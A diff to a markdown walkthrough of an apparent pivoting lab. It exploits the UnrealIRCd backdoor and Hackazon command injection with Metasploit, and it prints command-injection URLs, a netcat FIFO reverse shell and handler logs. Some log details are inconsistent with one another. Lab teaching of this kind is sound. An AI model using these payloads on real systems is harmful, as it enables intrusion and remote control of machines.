@@ -424,6 +424,7 @@ meterpreter >
 
 The Meterpreter session is much more useful than a bare shell, it allows us to easily upload/download files,
 set up proxies or port-forwarding, and more (run the `help` command to see everything you can do).
+Instead of (Ctrl+Z) for simple shells, to send a Meterpreter session to the background use the command `background`.
 
 ## Setting Up a Proxy
 
@@ -657,7 +658,9 @@ It must fit two criteria :
 We can either set up a bind shell listener on the target and connect to it through our previous session,
 or we can set up a reverse shell listener in our previous session and connect back to it from our target.
 
-For the reverse shell, set `LHOST` to the IP address of the pivot on the same network as the target,
+
+For the reverse shell, we can use the simple perl reverse shell `payload payload/cmd/unix/reverse_perl`.
+Set `LHOST` to the IP address of the pivot on the same network as the target,
 and `LPORT` (the listening port on our pivot session) to an unused port.
 You can check which ports are in use by running `netstat -a` in your Meterpreter session.
 You'll need to use an unprivileged port (higher than 1024) if you didn't get root privileges previously.
@@ -689,13 +692,14 @@ uid=1121(boba_fett) gid=100(users) groups=100(users)
 ```
 
 Alternatively, using a bind shell is slightly simpler.
+One of the Bind shell payloads supported for this exploit which we can use is `payload/cmd/unix/bind_perl`.
 You'll need to set `LPORT` (the port on the target which the shell will listen on) to an unused port.
 We can't just check with `netstat -a` since we don't have access yet,
 but a good start would be to pick an unprivileged port that didn't show up in your nmap scan,
 and one that's not [commonly used](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers#Well-known_ports).
 
 ```
-msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 0
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 1
 payload => cmd/unix/bind_perl
 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 172.25.0.3
 RHOSTS => 172.25.0.3
@@ -778,13 +782,11 @@ msf6 post(multi/manage/autoroute) > run
 msf6 post(multi/manage/autoroute) > 
 ```
 
-# Final box
+# Third box
 
 ## Network Scan
 
 Now we can access this network through our existing SOCKS proxy using `proxychains4` on our own machine.
-
-
 We'll begin by searching for any active hosts on the network with a standard host discovery scan:
 
 ```
@@ -841,40 +843,61 @@ Go to the network settings, and add the details for your proxy there:
 
 ![Proxy Settings.png](docs/resources/Proxy Settings.png)
 
+Now you should be able to access the website at http://172.26.0.3/ (or the IP for the Hackazon server if it's different).
+
+![Hackazon.png](docs/resources/Hackazon Home Page.png)
+
+First thing you should do is make an account on the website.
+You can use fake details here, it doesn't matter, but being signed in gives you access to more of the website.
+
 
 ## Attaining Remote Code Execution via Command Injection
 
 Again, feel free to use any of the exploits exposed on the website to achieve a shell here, I'll demonstrate just one of them.
 
 We can exploit an OS command injection vulnerability to attain arbitrary code execution as the user running the web server process.
-The URL query parameter at http://172.26.0.2/account/documents?page=delivery.html is vulnerable to OS command injection, so you can run arbitrary OS commands by going to:
+The URL query parameter at http://172.26.0.3/account/documents?page=delivery.html is vulnerable to OS command injection, so you can run arbitrary OS commands by going to:
 
-http://172.26.0.2/account/documents?page=<your-command-here>
+http://172.26.0.3/account/documents?page=<your-command-here>
 
-Two notes though:
+Some notes though:
 
-- Firstly I found increased reliability by putting a test before your command, i.e.
-    http://172.26.0.2/account/documents?page=test|<your-command-here>
-
+- I found increased reliability by putting a test before your command, i.e.
+    http://172.26.0.3/account/documents?page=test||<your-command-here>
 - Secondly, I found that whenever there was an ampersand in the command, such as a `2>&1`, it stopped reading at the `&` and wouldn't work.
 
 ## Setting up the listener - The easy way
 
-You could just do `nc -lvnp 1337` and be done, but if you want a proper meterpreter shell keep reading.
+We need to set up a listener on the pivot machine that is accessible from the Hackazon box, i.e. the second box we took over.
+The simplest listener is simply using Netcat to bind to a port on the pivot machine accessible to the Hackazon server.
+You could just do `nc -lvnp <an-unused-port>` and be done, but if you want a proper meterpreter shell we can do the following:
 
-## Setting up the listener - The proper way
+## Setting up a reverse shell listener
+
+Similar to the instructions for setting up a reverse shell on the previous box, we'll spawn a `multi/handler` on the pivot box.
+Make sure to use an unused port for `LPORT`, and the IP address of the pivot box on the internal network.
+This is the IP address we got from running `ifconfig` on our previous meterpreter session.
+Finally, set `ReverseListenerComm` to the session ID of your previous pivot's session:
 
 ```
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set LHOST 172.17.0.1
-LHOST => 172.17.0.1
-msf6 exploit(multi/handler) > set LPORT 1337
-LPORT => 1337
-msf6 exploit(multi/handler) > run
-
-[*] Started reverse TCP handler on 172.17.0.1:1337
+msf6 exploit(multi/handler) > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 172.26.0.2
+LHOST => 172.26.0.2
+msf6 exploit(multi/handler) > set LPORT 31337
+LPORT => 31337
+msf6 exploit(multi/handler) > set ReverseListenerComm 4
+ReverseListenerComm => 4
+msf6 exploit(multi/handler) > set ExitOnSession false
+ExitOnSession => false
+msf6 exploit(multi/handler) > run -j
+[*] Exploit running as background job 3.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) > 
 ```
 
+By default, this will stay in the foreground until a session is established,
+that's why we disable `ExitOnSession` and spawn the handler as a job with `run -j`.
 
 ## Launching the reverse shell
 
@@ -882,21 +905,20 @@ Now to start a netcat reverse shell on the victim machine you have to do a janky
 so instead of normal netcat it has a more "secure" version without the `-e` or `-c` flags that we would usually use to pipe `/bin/bash` straight into it.
 
 First, create a temporary FIFO pipe (pipeline) in /tmp by running `mknod /tmp/backpipe p` through command injection.
-Go to the following link in your browser:
+The URL for this command will look like:
 
-http://localhost:8081/account/documents?page=test|mknod%20/tmp/backpipe%20p
+http://172.26.0.3/account/documents?page=test|mknod%20/tmp/backpipe%20p
 
 You don't need to double URL encode your special characters, the browser might hide from you that it does it automatically once though.
 Next, you can start the reverse shell by running the following command (with your own IP address and port substituted):
 
 ```shell
-/bin/sh 0</tmp/backpipe | nc <YOUR-HOST/ATTACKER-IP> 1337 1>/tmp/backpipe
+/bin/sh 0</tmp/backpipe | nc YOUR-PIVOT-IP YOUR-PIVOT-PORT 1>/tmp/backpipe
 ```
 
 Which in command-injected URL form looks something like:
 
-http://localhost:8081/account/documents?page=test|/bin/sh%200%3C/tmp/backpipe%20|%20nc%20172.17.0.1%201337%201%3E/tmp/backpipe
-
+http://172.26.0.3/account/documents?page=test|/bin/sh%200%3C/tmp/backpipe%20|%20nc%20172.26.0.2%2031337%201%3E/tmp/backpipe
 
 This tab may look like it's loading forever in your browser because it makes a blocking request on the PHP server that doesn't release the thread until the reverse shell closes.
 
@@ -904,38 +926,46 @@ If you switch back to your reverse shell in Metasploit, you should see a new con
 Try running a command such as id:
 
 ```
-[*] Started reverse TCP handler on 172.17.0.1:1337 
-[*] Command shell session 1 opened (172.17.0.1:1337 -> 172.17.0.2:60084) at 2023-12-28 20:55:33 -0500
-
+[*] Command shell session 5 opened (172.26.0.2:31337 -> 172.26.0.3:46452 via session 4) at 2024-07-21 20:48:44 -0400
 id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[*] exec: id
+
+uid=0(root) gid=0(root) groups=0(root),988(docker)
 ```
 
 ## Upgrading to a Meterpreter session
 
-To upgrade your basic generic TCP reverse shell to a Meterpreter shell, press Ctrl+Z to send that session to the background.
-Then run the session upgrade command on the session you earlier opened:
+Same as usual, send your basic shell to the background and upgrade your session with (Ctrl+z) and `sessions -u -1`:
 
 ```
-msf6 exploit(multi/handler) > sessions -u 1
-[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+msf6 exploit(multi/handler) > sessions -u -1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [-1]
 
-[*] Upgrading session ID: 1
+[*] Upgrading session ID: 5
 [*] Starting exploit/multi/handler
-[*] Started reverse TCP handler on 172.17.0.1:4433 
-[*] Sending stage (1017704 bytes) to 172.17.0.2
-[*] Meterpreter session 2 opened (172.17.0.1:4433 -> 172.17.0.2:48016) at 2023-12-28 20:56:25 -0500
+[*] Started reverse TCP handler on 172.26.0.2:4433 via the meterpreter on session 4
+[*] Sending stage (1017704 bytes) to 172.26.0.3
 [*] Command stager progress: 100.00% (773/773 bytes)
+[*] Meterpreter session 6 opened (172.26.0.2:4433 -> 172.26.0.3:41710 via session 4) at 2024-07-21 20:53:18 -0400
+[*] Stopping exploit/multi/handler
 ```
 
-Now you've upgraded your puny shell to a glorious Meterpreter session.
-To get into Meterpreter, open your new session:
+Congratulations, at this point you should now have Meterpreter sessions on every box:
 
 ```
-msf6 exploit(multi/handler) > sessions -i 3
-[*] Starting interaction with 3...
+msf6 exploit(multi/handler) > sessions
 
-meterpreter >
+Active sessions
+===============
+
+  Id  Name  Type                   Information             Connection
+  --  ----  ----                   -----------             ----------
+  1         shell cmd/unix                                 172.24.0.1:41493 -> 172.24.0.2:6200 (172.24.0.2)
+  2         meterpreter x86/linux  root @ 172.24.0.2       172.24.0.1:4433 -> 172.24.0.2:43430 (172.24.0.2)
+  3         shell cmd/unix                                 172.25.0.2:54480 -> 172.25.0.3:21337 via session 2 (172.25.0.3)
+  4         meterpreter x86/linux  boba_fett @ 172.26.0.2  172.25.0.2:4433 -> 172.25.0.3:55556 via session 2 (172.25.0.3)
+  5         shell sparc/bsd                                172.26.0.2:31337 -> 172.26.0.3:46452 via session 4 (172.26.0.3)
+  6         meterpreter x86/linux  www-data @ 172.26.0.3   172.26.0.2:4433 -> 172.26.0.3:41710 via session 4 (172.26.0.3)
 ```
 
 # Extra Resources
